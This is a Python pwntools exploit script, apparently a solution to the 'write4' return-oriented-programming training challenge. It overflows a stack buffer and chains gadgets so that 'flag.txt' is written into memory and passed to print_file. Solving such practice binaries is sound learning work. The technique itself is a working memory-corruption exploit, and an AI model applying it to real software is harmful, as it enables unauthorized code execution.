from pwn import ELF, gdb, process, p64   # type: ignore
'''target = gdb.debug(
    './write4',
    gdbscript=''
)'''
target = process('./write4')

elf = ELF('./write4')
print_file_plt = elf.symbols['print_file']

ret = p64(0x4004e6)
empty_space = p64(0x601040)
pop_rdi_ret = p64(0x400693)
pop_r13_r14_r15_ret = p64(0x40068e)
mov_r14_r15_ret = p64(0x400628)

payload = b''
payload += b'A' * 40
payload += ret
#payload += b'CCCCCCCC'
payload += pop_r13_r14_r15_ret
payload += p64(0x0)
payload += empty_space
payload += b'flag.txt'
payload += mov_r14_r15_ret
payload += pop_rdi_ret
payload += empty_space
payload += p64(0x00400620)  # print_file call
target.sendline(payload)
target.interactive()
